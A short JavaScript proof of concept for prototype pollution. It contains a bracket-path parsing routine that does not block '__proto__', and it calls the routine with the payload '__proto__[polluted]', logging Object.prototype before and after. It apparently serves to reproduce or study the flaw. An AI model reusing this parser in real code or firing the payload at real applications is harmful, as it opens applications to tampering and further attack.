function test(arg1, arg2) {

    console.log(({}).polluted);
  
    var keyBreaker = /([^\[\]]+)|(\[\])/g
    var cur = {};
    var val = arg2;
    var keys = arg1.match(keyBreaker);
    var keys_last = keys.length - 1;
    for (var i = 0 ; i <= keys_last; i++ ) {
        key = keys[i] === '' ? cur.length : keys[i];
        cur = cur[key] = i < keys_last
          ? cur[key] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] )
          : val;
    }
  
    console.log(({}).polluted);
    
}

test('__proto__[polluted]', 'true')